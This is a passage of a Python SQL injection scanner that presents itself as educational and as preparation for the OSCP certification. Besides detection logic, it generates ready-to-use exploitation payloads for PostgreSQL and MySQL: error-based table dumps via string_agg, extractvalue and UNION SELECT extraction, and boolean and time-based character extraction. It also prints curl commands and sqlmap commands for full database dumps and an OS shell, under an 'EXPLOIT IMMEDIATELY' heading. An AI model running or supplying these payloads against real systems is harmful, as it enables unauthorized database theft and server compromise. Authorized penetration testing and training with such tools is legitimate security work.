                'purpose': 'Get total number of records to plan data extraction',
                'what_to_look_for': 'Number after "Count: " in error (e.g., "Count: 4" = 4 records)',
                'requires_input': 'TABLENAME'
            },
            {
                'title': 'Dump Entire Table (All Records + All Columns)',
                'payload': "1' AND 1=CAST((SELECT string_agg(col1::text || ',' || col2 || ',' || col3, ' | ') FROM TABLENAME) AS int)--",
                'grep_pattern': '| grep -i "invalid\\|error\\|warning" -A5',
                'purpose': 'Extract ALL data from table in a SINGLE query',
                'what_to_look_for': 'Complete table contents: "row1_data | row2_data | row3_data"',
                'requires_input': 'TABLENAME and replace col1,col2,col3 with actual column names',
                'efficiency_note': 'Use ::text for numeric columns. Example: string_agg(id::text || \',\' || username || \',\' || password, \' | \')',
                'example': 'For users(id,username,password): string_agg(id::text || \',\' || username || \',\' || password, \' | \') dumps all users'
            }
        ]

        # Build curl commands
        formatted_steps = []
        for step in steps:
            if self.method == 'POST':
                data_copy = self.post_params.copy()
                data_copy[param] = [step['payload']]
                data_str = '&'.join([f"{k}={v[0] if isinstance(v, list) else v}"
                                    for k, v in data_copy.items()])

                curl_cmd = f"curl -X POST {self.target} \\\n  -d \"{data_str}\" \\\n  {step['grep_pattern']}"
            else:
                # GET request
                curl_cmd = f"curl \"{self.target}?{param}={step['payload']}\" \\\n  {step['grep_pattern']}"

            formatted_steps.append({
                'title': step['title'],
                'curl': curl_cmd,
                'purpose': step['purpose'],
                'what_to_look_for': step['what_to_look_for'],
                'critical_note': step.get('critical_note'),
                'efficiency_note': step.get('efficiency_note'),
                'iterate_note': step.get('iterate_note'),
                'requires_input': step.get('requires_input'),
                'example': step.get('example')
            })

        return formatted_steps

    def generate_curl_recommendations(self, finding, param):
        """Generate database-specific curl commands with grep patterns"""

        db_type = finding.get('db_type', 'unknown').lower()
        injection_type = finding['type']

        recommendations = []

        # Database-specific recommendation dictionaries
        if injection_type == 'error':
            if 'postgresql' in db_type:
                recommendations = self._get_postgresql_error_steps(param)
            elif 'mysql' in db_type:
                recommendations = self._get_mysql_error_steps(param)
            elif 'mssql' in db_type:
                recommendations = self._get_mssql_error_steps(param)
            elif 'oracle' in db_type:
                recommendations = self._get_oracle_error_steps(param)

        elif injection_type == 'boolean':
            recommendations = self._get_boolean_steps(param, db_type)

        elif injection_type == 'time':
            recommendations = self._get_time_steps(param, db_type)

        elif injection_type == 'union':
            col_count = finding.get('column_count', 3)
            recommendations = self._get_union_steps(param, col_count)

        return recommendations

    def display_curl_recommendations(self, recommendations):
        """Display formatted curl recommendations"""

        if not recommendations:
            return

        print(f"\n{Colors.BOLD}[RECOMMENDED CURL COMMANDS]{Colors.END}")
        print("─" * 60)

        for i, rec in enumerate(recommendations, 1):
            print(f"\n{Colors.CYAN}{i}. {rec['title']}{Colors.END}")
            print(f"   {Colors.YELLOW}├─ Command:{Colors.END}")
            for line in rec['curl'].split('\n'):
                print(f"      {Colors.GREEN}{line}{Colors.END}")
            print(f"   {Colors.YELLOW}├─ Purpose:{Colors.END} {rec['purpose']}")
            print(f"   {Colors.YELLOW}└─ What to look for:{Colors.END} {rec['what_to_look_for']}")

            if rec.get('critical_note'):
                print(f"      {Colors.RED}⚠ CRITICAL:{Colors.END} {rec['critical_note']}")

            if rec.get('efficiency_note'):
                print(f"      {Colors.BLUE}⚡ Efficiency:{Colors.END} {rec['efficiency_note']}")

            if rec.get('iterate_note'):
                print(f"      {Colors.BLUE}↻ Iterate:{Colors.END} {rec['iterate_note']}")

            if rec.get('requires_input'):
                print(f"      {Colors.RED}⚠ Replace:{Colors.END} {rec['requires_input']} with actual value")

            if rec.get('example'):
                print(f"      {Colors.GREEN}📝 Example:{Colors.END} {rec['example']}")

    def scan_parameter(self, param, original_value=''):
        """Scan a single parameter for SQL injection"""
        param_findings = []

        print(f"\n{Colors.BLUE}[*] Testing parameter: {param}{Colors.END}")

        # Run different test techniques
        if self.technique in ['error', 'all']:
            error_findings = self.test_error_based(param, original_value)
            param_findings.extend(error_findings)

        if self.technique in ['boolean', 'all']:
            boolean_findings = self.test_boolean_based(param, original_value)
            param_findings.extend(boolean_findings)

        if self.technique in ['time', 'all']:
            time_findings = self.test_time_based(param, original_value)
            param_findings.extend(time_findings)

        if self.technique in ['union', 'all']:
            union_findings = self.test_union_based(param, original_value)
            param_findings.extend(union_findings)

        # Report findings for this parameter
        if param_findings:
            highest_confidence = max(f['confidence'] for f in param_findings)
            color = Colors.GREEN if highest_confidence >= 80 else Colors.YELLOW

            print(f"{color}  ✓ SQL Injection detected! [Max Confidence: {highest_confidence}%]{Colors.END}")

            for finding in param_findings:
                if finding['type'] == 'error':
                    print(f"    • Error-based: {finding['db_type']} database detected")
                    if finding.get('snippet'):
                        print(f"      Error: {finding['snippet'][:100]}...")
                elif finding['type'] == 'boolean':
                    print(f"    • Boolean-based: {finding['description']}")
                    print(f"      Difference: {finding['size_diff']} bytes")
                elif finding['type'] == 'time':
                    print(f"    • Time-based: {finding['db_type']} - Delay: {finding['delay']:.1f}s")
                elif finding['type'] == 'union':
                    print(f"    • UNION-based: {finding['column_count']} columns detected")

            # Store findings
            self.vulnerabilities.append({
                'param': param,
                'findings': param_findings,
                'max_confidence': highest_confidence
            })

            # Track high-confidence findings for early termination
            if highest_confidence >= 80:
                self.high_conf_found += 1
        else:
            print(f"  ✗ No SQL injection detected")

    def scan(self):
        """Main scanning process"""
        print(f"\n{Colors.BOLD}[SQL INJECTION SCANNER]{Colors.END}")
        print("=" * 60)
        print(f"Target: {self.target}")
        print(f"Method: {self.method}")

        # Determine parameters to test
        params_to_test = []

        if self.test_params:
            # User specified parameters
            params_to_test = self.test_params.split(',')
            print(f"Parameters: {', '.join(params_to_test)} (user-specified)")
        elif self.method == 'GET' and self.base_params:
            # GET parameters from URL
            params_to_test = list(self.base_params.keys())
            print(f"Parameters: {', '.join(params_to_test)} (from URL)")
        elif self.method == 'POST' and self.post_params:
            # POST parameters from data
            params_to_test = list(self.post_params.keys())
            print(f"Parameters: {', '.join(params_to_test)} (from POST data)")
        else:
            print(f"{Colors.RED}[!] No parameters found to test{Colors.END}")
            print("\nSpecify parameters with -p or provide POST data with -d")
            return

        techniques = []
        if self.technique == 'all':
            techniques = ['Error-based', 'Boolean-based', 'Time-based', 'UNION-based']
        else:
            techniques = [self.technique.capitalize() + '-based']

        print(f"Techniques: {', '.join(techniques)}")
        print(f"Mode: {'Quick scan' if self.quick else 'Full scan'}")
        print("-" * 60)

        # Establish baseline
        self.get_baseline()

        # Test each parameter
        for param in params_to_test:
            # Get original value if it exists
            original_value = ''
            if self.method == 'GET' and param in self.base_params:
                original_value = self.base_params[param][0] if isinstance(self.base_params[param], list) else self.base_params[param]
            elif self.method == 'POST' and param in self.post_params:
                original_value = self.post_params[param][0] if isinstance(self.post_params[param], list) else self.post_params[param]

            self.scan_parameter(param, str(original_value))

            # Check for early termination threshold
            if self.min_findings > 0 and self.high_conf_found >= self.min_findings:
                remaining = len(params_to_test) - (params_to_test.index(param) + 1)
                if remaining > 0:
                    print(f"\n{Colors.YELLOW}[!] Early termination: Found {self.high_conf_found} high-confidence vulnerability(ies) (threshold: {self.min_findings}){Colors.END}")
                    print(f"    Skipping remaining {remaining} parameter(s). Use --min-findings 0 to test all.")
                break

    def generate_report(self):
        """Generate final report with exploitation guidance"""
        print(f"\n{Colors.BOLD}[VULNERABILITIES FOUND]{Colors.END}")
        print("=" * 60)

        if not self.vulnerabilities:
            print(f"{Colors.YELLOW}No SQL injection vulnerabilities detected{Colors.END}")
            print(f"\nTotal tests performed: {self.tested_count}")

            print(f"\n{Colors.BOLD}[NEXT STEPS]{Colors.END}")
            print("-" * 40)
            print(f"{Colors.BLUE}• EXPAND TESTING:{Colors.END}")
            print(f"  └─ python3 {sys.argv[0]} {self.target} --technique all --verbose")
            print(f"     # Try all injection techniques with detailed output")
            print(f"\n  └─ python3 {sys.argv[0]} {self.target} -m POST -d 'param1=value1&param2=value2'")
            print(f"     # Test with POST method if currently using GET")
            print(f"\n{Colors.YELLOW}• ALTERNATIVE APPROACHES:{Colors.END}")
            print(f"  └─ sqlmap -u '{self.target}' --batch --risk=3 --level=5")
            print(f"     # Use sqlmap with maximum testing levels")
            print(f"\n  └─ Check for second-order SQL injection in other pages")
            print(f"     # Input might be stored and executed elsewhere")
            return

        # Sort by confidence
        self.vulnerabilities.sort(key=lambda x: x['max_confidence'], reverse=True)

        high_conf = [v for v in self.vulnerabilities if v['max_confidence'] >= 80]
        med_conf = [v for v in self.vulnerabilities if 50 <= v['max_confidence'] < 80]
        low_conf = [v for v in self.vulnerabilities if v['max_confidence'] < 50]

        if high_conf:
            print(f"\n{Colors.RED}High Confidence (≥80%):{Colors.END}")
            for vuln in high_conf:
                types = set(f['type'] for f in vuln['findings'])
                print(f"  • {vuln['param']} [{vuln['max_confidence']}%] - Types: {', '.join(types)}")

        if med_conf:
            print(f"\n{Colors.YELLOW}Medium Confidence (50-79%):{Colors.END}")
            for vuln in med_conf:
                types = set(f['type'] for f in vuln['findings'])
                print(f"  • {vuln['param']} [{vuln['max_confidence']}%] - Types: {', '.join(types)}")

        if low_conf and self.verbose:
            print(f"\nLow Confidence (<50%):")
            for vuln in low_conf:
                types = set(f['type'] for f in vuln['findings'])
                print(f"  • {vuln['param']} [{vuln['max_confidence']}%] - Types: {', '.join(types)}")

        # Exploitation guide for highest confidence finding
        if self.vulnerabilities:
            best_vuln = self.vulnerabilities[0]
            best_finding = max(best_vuln['findings'], key=lambda x: x['confidence'])

            print(f"\n{Colors.BOLD}[EXPLOITATION GUIDE]{Colors.END}")
            print("=" * 60)
            print(f"Parameter: {best_vuln['param']}")
            print(f"Method: {best_finding['type'].capitalize()}-based injection")

            if best_finding['type'] == 'error':
                db_type = best_finding.get('db_type', 'unknown')
                print(f"Database: {db_type}")

                # Show actual error text that identified the database
                if best_finding.get('snippet'):
                    snippet = best_finding['snippet'][:120]
                    print(f"Detected via: {snippet}...")
            elif best_finding['type'] == 'union':
                print(f"Columns: {best_finding.get('column_count', 'unknown')}")

            print(f"\n{Colors.CYAN}Manual Exploitation:{Colors.END}")

            param = best_vuln['param']

            if best_finding['type'] == 'error':
                print(f"  1. Extract database version:")
                if 'mysql' in str(best_finding.get('db_type', '')).lower():
                    print(f"     {self.target}?{param}=' AND extractvalue(1,concat(0x7e,version()))--")
                    print(f"\n  2. Extract database name:")
                    print(f"     {self.target}?{param}=' AND extractvalue(1,concat(0x7e,database()))--")
                    print(f"\n  3. Extract table names:")
                    print(f"     {self.target}?{param}=' AND extractvalue(1,concat(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 1)))--")
                else:
                    print(f"     {self.target}?{param}=' AND 1=CONVERT(int,@@version)--")

            elif best_finding['type'] == 'boolean':
                print(f"  1. Test for specific content:")
                print(f"     {self.target}?{param}=' AND (SELECT 'test')='test'--")
                print(f"\n  2. Extract data character by character:")
                print(f"     {self.target}?{param}=' AND SUBSTRING(database(),1,1)='a'--")
                print(f"     # Iterate through characters to extract database name")
                print(f"\n  3. Check table existence:")
                print(f"     {self.target}?{param}=' AND (SELECT COUNT(*) FROM users)>0--")

            elif best_finding['type'] == 'time':
                print(f"  1. Confirm with conditional delay:")
                print(f"     {self.target}?{param}=' AND IF(1=1,SLEEP(5),0)--")
                print(f"\n  2. Extract data via timing:")
                print(f"     {self.target}?{param}=' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--")
                print(f"     # If delay occurs, first character is 'a'")

            elif best_finding['type'] == 'union':
                cols = best_finding.get('column_count', 3)
                union_vals = ','.join([f'{i+1}' for i in range(cols)])
                print(f"  1. Find visible columns:")
                print(f"     {self.target}?{param}=' UNION SELECT {union_vals}--")
                print(f"     # Look for numbers 1,2,3... in response to identify columns")
                print(f"\n  2. Extract database info:")
                print(f"     {self.target}?{param}=' UNION SELECT database(),user(),version(){''.join([',NULL' for _ in range(cols-3)])}--")
                print(f"\n  3. Extract table names:")
                print(f"     {self.target}?{param}=' UNION SELECT table_name{',NULL' * (cols-1)} FROM information_schema.tables--")

            # NEW: Add database-specific curl recommendations
            if best_finding['type'] == 'error' and best_finding.get('db_type'):
                recommendations = self.generate_curl_recommendations(best_finding, param)
                self.display_curl_recommendations(recommendations)

            print(f"\n{Colors.CYAN}Automated Exploitation:{Colors.END}")

            if self.method == 'GET':
                print(f"  sqlmap -u '{self.target}' -p {param} --batch --dbs")
            else:
                post_str = '&'.join([f"{k}={v[0] if isinstance(v, list) else v}" for k, v in self.post_params.items()])
                print(f"  sqlmap -u '{self.target}' --data='{post_str}' -p {param} --batch --dbs")

            print(f"\n  # Dump specific database:")
            print(f"  sqlmap -u '...' -p {param} -D database_name --dump")
            print(f"\n  # Get OS shell (if privileges allow):")
            print(f"  sqlmap -u '...' -p {param} --os-shell")

        print(f"\n{Colors.BOLD}[SUMMARY]{Colors.END}")
        print("-" * 40)
        print(f"Total parameters tested: {len(params_to_test) if 'params_to_test' in locals() else 0}")
        print(f"Total tests performed: {self.tested_count}")
        print(f"Vulnerable parameters: {len(self.vulnerabilities)}")

        if self.vulnerabilities:
            print(f"Highest confidence: {self.vulnerabilities[0]['max_confidence']}%")

        # Next steps section
        print(f"\n{Colors.BOLD}[NEXT STEPS]{Colors.END}")
        print("-" * 40)

        if high_conf:
            print(f"{Colors.RED}• EXPLOIT IMMEDIATELY:{Colors.END}")
            for vuln in high_conf[:2]:
                param = vuln['param']
                finding_types = set(f['type'] for f in vuln['findings'])

                if 'union' in finding_types:
                    print(f"  └─ sqlmap -u '{self.target}' -p {param} --technique=U --dump")
                    print(f"     # UNION-based extraction is fastest and most reliable")
                elif 'error' in finding_types:
                    print(f"  └─ sqlmap -u '{self.target}' -p {param} --technique=E --dbs")
                    print(f"     # Error-based extraction for database enumeration")
                elif 'boolean' in finding_types:
                    print(f"  └─ sqlmap -u '{self.target}' -p {param} --technique=B --threads=10")
                    print(f"     # Boolean-based with multiple threads for speed")
                elif 'time' in finding_types:
                    print(f"  └─ sqlmap -u '{self.target}' -p {param} --technique=T --time-sec=3")
                    print(f"     # Time-based (slowest but stealthiest)")

        elif med_conf:
            print(f"{Colors.YELLOW}• INVESTIGATE FURTHER:{Colors.END}")
            print(f"  └─ python3 {sys.argv[0]} {self.target} --technique all --verbose")
            print(f"     # Run all techniques with verbose output")
            print(f"  └─ Manually verify with targeted payloads")
            print(f"     # Sometimes automated tools miss context-specific injections")

        else:
            print(f"{Colors.GREEN}• EXPAND ENUMERATION:{Colors.END}")
            print(f"  └─ Try different parameter values or encodings")
            print(f"  └─ Test for second-order SQL injection")
            print(f"  └─ Check for NoSQL injection if backend might be MongoDB/etc")

def parse_stdin():
    """Parse input from param_discover.py output"""
    targets = []

    if not sys.stdin.isatty():
        import re
        ansi_escape = re.compile(r'\x1b\[[0-9;]*m')

        current_target = None
        in_params_section = False

        for line in sys.stdin:
            # Remove ANSI color codes
            line = ansi_escape.sub('', line).strip()

            if not line:
                continue

            # Look for target URL
            if 'Target:' in line:
                match = re.search(r'Target:\s*(https?://[^\s]+)', line)
                if match:
                    current_target = match.group(1)

            # Track when we're in discovered parameters section
            if '[DISCOVERED PARAMETERS]' in line or 'DISCOVERED PARAMETERS' in line:
                in_params_section = True
                continue

            # Exit params section
            if in_params_section and ('[' in line or line.startswith('Total')):
                in_params_section = False

            # Extract parameters
            if in_params_section and current_target and '•' in line:
                # Format: • param_name [confidence%] - reasons
                match = re.match(r'\s*•\s*(\w+)\s*\[', line)
                if match:
                    param = match.group(1)
                    targets.append({'url': current_target, 'param': param})

    return targets

def handle_curl_command(args):
    """
    Handle curl command parsing and parameter selection
    """
    curl_command = args.from_curl

    # Read from stdin if "-" or not provided
    if curl_command == '-' or curl_command is None:
        print(f"{Colors.CYAN}[*] Reading curl command from stdin...{Colors.END}")
        print(f"{Colors.YELLOW}    Paste your curl command and press Enter (Ctrl+D when done):{Colors.END}")
        try:
            curl_command = sys.stdin.read().strip()
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[!] Cancelled{Colors.END}")
            sys.exit(0)

    if not curl_command:
        print(f"{Colors.RED}[!] Error: No curl command provided{Colors.END}")
        sys.exit(1)

    # Parse curl command
    print(f"\n{Colors.BOLD}[CURL COMMAND PARSER]{Colors.END}")
    print("=" * 60)

    try:
        parser = CurlParser(curl_command)
        parsed = parser.parse()
    except Exception as e:
        print(f"{Colors.RED}[!] Error parsing curl command: {e}{Colors.END}")
        sys.exit(1)

    # Display parsed information
    print(f"{Colors.GREEN}✓ Successfully parsed curl command{Colors.END}\n")
    print(f"{Colors.BOLD}Request Details:{Colors.END}")
    print(f"  URL: {parsed['url']}")
    print(f"  Method: {parsed['method']}")

    if parsed['headers']:
        print(f"  Headers: {len(parsed['headers'])} found")
        important_headers = ['Cookie', 'Authorization', 'Content-Type']
        for hdr in important_headers:
            if hdr in parsed['headers']:
                value = parsed['headers'][hdr]
                if len(value) > 60:
                    value = value[:60] + '...'
                print(f"    - {hdr}: {value}")

    if parsed['data']:
        print(f"  POST Data: {len(parsed['data'])} bytes")

    # Get testable parameters
    testable = parser.get_testable_params()

    if not testable:
        print(f"\n{Colors.YELLOW}[!] No testable parameters found{Colors.END}")
        print(f"{Colors.YELLOW}    The request may not contain injectable parameters{Colors.END}")
        sys.exit(0)

    print(f"\n{Colors.BOLD}Testable Parameters: {len(testable)} found{Colors.END}")
    print("-" * 60)

    # Display parameters with priority
    priority_colors = {
        'high': Colors.GREEN,
        'medium': Colors.YELLOW,
        'low': Colors.BLUE
    }

    for idx, (param, priority) in enumerate(testable, 1):
        color = priority_colors.get(priority, Colors.END)
        priority_label = f"[{priority.upper()}]"
        print(f"  {idx}. {color}{param}{Colors.END} {priority_label}")

    # Interactive parameter selection
    # Check if we can read from terminal (not piped)
    import os
    is_terminal = os.isatty(0)  # 0 is stdin

    choice = ''
    if not is_terminal or (curl_command == '-' or curl_command is None):
        # Piped input or reading from stdin - default to first parameter
        print(f"\n{Colors.CYAN}[*] Auto-selecting parameter #1 (highest priority){Colors.END}")
        print(f"{Colors.YELLOW}    (Use 'crack sqli-scan --from-curl \"<curl>\"' with quoted argument for interactive selection){Colors.END}")
        choice = '1'
    else:
        # Interactive mode
        print(f"\n{Colors.CYAN}Select parameter to test:{Colors.END}")
        print(f"  {Colors.YELLOW}• Enter number (1-{len(testable)}){Colors.END}")
        print(f"  {Colors.YELLOW}• Enter 'all' to test all parameters{Colors.END}")
        print(f"  {Colors.YELLOW}• Press Enter to test #1 (highest priority){Colors.END}")
        print(f"  {Colors.YELLOW}• Enter 'cmd' to show sqli-scan command only{Colors.END}")

        try:
            choice = input(f"\n{Colors.BOLD}Your choice: {Colors.END}").strip().lower()
        except (KeyboardInterrupt, EOFError):
            print(f"\n{Colors.YELLOW}[!] Cancelled{Colors.END}")
            sys.exit(0)

    # Determine which parameters to test
    params_to_test = []
    show_command_only = False

    if choice == 'cmd':
        show_command_only = True
        choice = '1'  # Default to first param for command generation

    if choice == '' or choice == '1':
        params_to_test = [testable[0][0]]
    elif choice == 'all':
        params_to_test = [p[0] for p in testable]
    elif choice.isdigit():
        idx = int(choice) - 1
        if 0 <= idx < len(testable):
            params_to_test = [testable[idx][0]]
        else:
            print(f"{Colors.RED}[!] Invalid choice{Colors.END}")
            sys.exit(1)
    else:
        print(f"{Colors.RED}[!] Invalid choice{Colors.END}")
        sys.exit(1)

    # Generate sqli-scan command
    params_str = ','.join(params_to_test)

    # Build the command
    cmd_parts = ['crack sqli-scan', parsed['url']]
    cmd_parts.append(f"-m {parsed['method']}")

    if parsed['data']:
        cmd_parts.append(f"-d '{parsed['data']}'")

    cmd_parts.append(f"-p '{params_str}'")

    # Add common flags
    if args.verbose:
        cmd_parts.append('-v')
    if args.quick:
        cmd_parts.append('-q')
    if args.technique and args.technique != 'all':
        cmd_parts.append(f"-t {args.technique}")

    command = ' '.join(cmd_parts)

    print(f"\n{Colors.BOLD}[GENERATED COMMAND]{Colors.END}")
    print("=" * 60)
    print(f"{Colors.CYAN}{command}{Colors.END}")
    print("=" * 60)

    if show_command_only:
        print(f"\n{Colors.GREEN}✓ Command generated. Copy and run manually.{Colors.END}")
        sys.exit(0)

    # Ask to run scan (or auto-run for piped input)
    if not is_terminal or (curl_command == '-' or curl_command is None):
        # Piped input - auto-run
        print(f"\n{Colors.GREEN}[*] Starting scan automatically...{Colors.END}")
        run_scan = 'y'
    else:
        # Interactive - ask user
        try:
            run_scan = input(f"\n{Colors.BOLD}Run scan now? [Y/n]: {Colors.END}").strip().lower()
        except (KeyboardInterrupt, EOFError):
            print(f"\n{Colors.YELLOW}[!] Cancelled{Colors.END}")
            sys.exit(0)

    if run_scan in ['', 'y', 'yes']:
        print(f"\n{Colors.GREEN}[*] Starting scan...{Colors.END}\n")

        # Create scanner instance
        try:
            scanner = SQLiScanner(
                parsed['url'],
                method=parsed['method'],
                data=parsed['data'],
                params=params_str,
                technique=args.technique,
                verbose=args.verbose,
                quick=args.quick,
                delay=args.delay,
                timeout=args.timeout,
                min_findings=args.min_findings
            )

            scanner.scan()
            scanner.generate_report()

            # Save output if requested
            if args.output:
                with open(args.output, 'w') as f:
                    f.write(f"Scan results for: {parsed['url']}\n")
                    f.write(f"Parameter(s): {params_str}\n")
                    f.write(f"Vulnerabilities found: {len(scanner.vulnerabilities)}\n")
                print(f"\n{Colors.GREEN}[*] Results saved to: {args.output}{Colors.END}")

        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[!] Scan interrupted by user{Colors.END}")
        except Exception as e:
            print(f"{Colors.RED}[!] Error during scan: {e}{Colors.END}")
            sys.exit(1)
    else:
        print(f"{Colors.YELLOW}[!] Scan cancelled. Use the command above to run manually.{Colors.END}")

def main():
    parser = argparse.ArgumentParser(
        description='SQL Injection Scanner - Educational SQLi vulnerability detection',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Test GET parameters in URL
  python3 sqli_scanner.py "http://target.com/page.php?id=1&name=test"

  # Test POST parameters
  python3 sqli_scanner.py http://target.com/login.php -d "username=admin&password=pass"

  # Test specific parameters
  python3 sqli_scanner.py http://target.com/page.php -p id,search,filter

  # Pipeline from param_discover.py
  python3 param_discover.py http://target.com | python3 sqli_scanner.py

  # Quick scan with specific technique
  python3 sqli_scanner.py http://target.com/page.php?id=1 -q -t error

  # Verbose scan of POST form
  python3 sqli_scanner.py http://target.com/form.php -m POST -d "weight=75&height=180" -v

Educational Notes:
  This tool teaches SQL injection detection techniques.
  Always use responsibly and only on authorized targets.
  For OSCP preparation, understand both manual and automated approaches.
        """
    )

    parser.add_argument('target', nargs='?', help='Target URL with parameters')
    parser.add_argument('-m', '--method', default='AUTO', choices=['GET', 'POST', 'AUTO'],
                       help='HTTP method (default: AUTO-detect)')
    parser.add_argument('-d', '--data', help='POST data string (e.g., "param1=value1&param2=value2")')
    parser.add_argument('-p', '--params', help='Specific parameters to test (comma-separated)')
    parser.add_argument('-t', '--technique', default='all',
                       choices=['error', 'boolean', 'time', 'union', 'all'],
                       help='Specific injection technique to test (default: all)')
    parser.add_argument('-q', '--quick', action='store_true',
                       help='Quick scan - test only high-probability payloads')
    parser.add_argument('-v', '--verbose', action='store_true',
                       help='Show all test details and payloads')
    parser.add_argument('--delay', type=float, default=0.5,
                       help='Delay between requests in seconds (default: 0.5)')
    parser.add_argument('--timeout', type=int, default=10,
                       help='Request timeout in seconds (default: 10)')
    parser.add_argument('-n', '--min-findings', type=int, default=0,
                       help='Stop after finding N high-confidence (≥80%%) vulnerabilities (default: 0 = disabled, test all parameters)')
    parser.add_argument('-o', '--output', help='Save detailed results to file')
    parser.add_argument('--from-curl', nargs='?', const='-', metavar='CURL_CMD',
                       help='Parse curl command from Burp Suite (use "-" or omit value to read from stdin)')

    args = parser.parse_args()

    # Handle curl command parsing
    if args.from_curl is not None:
        handle_curl_command(args)
        return

    # Handle piped input from param_discover.py
    piped_targets = parse_stdin()

    if not args.target and not piped_targets:
        print(f"{Colors.RED}Error: No target provided{Colors.END}")
        parser.print_help()
        sys.exit(1)

    # Process targets
    if piped_targets:
        print(f"{Colors.BOLD}[BATCH MODE]{Colors.END}")
        print(f"Processing {len(piped_targets)} parameter(s) from param_discover.py")
        print("-" * 60)

        all_vulnerabilities = []

        for item in piped_targets:
            print(f"\n{Colors.BOLD}Testing: {item['url']} - Parameter: {item['param']}{Colors.END}")

            try:
                scanner = SQLiScanner(
                    item['url'],
                    method=args.method,
                    data=args.data,
                    params=item['param'],
                    technique=args.technique,
                    verbose=args.verbose,
                    quick=args.quick,
                    delay=args.delay,
                    timeout=args.timeout,
                    min_findings=args.min_findings
                )

                scanner.scan()
                scanner.generate_report()

                if scanner.vulnerabilities:
                    all_vulnerabilities.extend(scanner.vulnerabilities)

            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}[!] Scan interrupted by user{Colors.END}")
                break
            except Exception as e:
                print(f"{Colors.RED}[!] Error: {e}{Colors.END}")

        # Final summary
        if len(piped_targets) > 1:
            print(f"\n{Colors.BOLD}[BATCH SUMMARY]{Colors.END}")
            print("=" * 60)
            print(f"Total parameters tested: {len(piped_targets)}")
            print(f"Vulnerable parameters found: {len(all_vulnerabilities)}")

            if all_vulnerabilities:
                print(f"\n{Colors.RED}Vulnerable parameters:{Colors.END}")
                for vuln in all_vulnerabilities:
                    print(f"  • {vuln['param']} [{vuln['max_confidence']}%]")

    else:
        # Single target mode
        try:
            scanner = SQLiScanner(
                args.target,
                method=args.method,
                data=args.data,
                params=args.params,
                technique=args.technique,
                verbose=args.verbose,
                quick=args.quick,
                delay=args.delay,
                timeout=args.timeout,
                min_findings=args.min_findings
            )

            scanner.scan()
            scanner.generate_report()

            # Save output if requested
            if args.output and scanner.vulnerabilities:
                with open(args.output, 'w') as f:
                    json.dump({
                        'target': args.target,
                        'method': scanner.method,
                        'vulnerabilities': scanner.vulnerabilities,
                        'total_tests': scanner.tested_count
                    }, f, indent=2)
                print(f"\n{Colors.GREEN}[+] Results saved to {args.output}{Colors.END}")

        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[!] Scan interrupted by user{Colors.END}")
        except Exception as e:
            print(f"{Colors.RED}[!] Error: {e}{Colors.END}")
            sys.exit(1)

if __name__ == '__main__':
    main()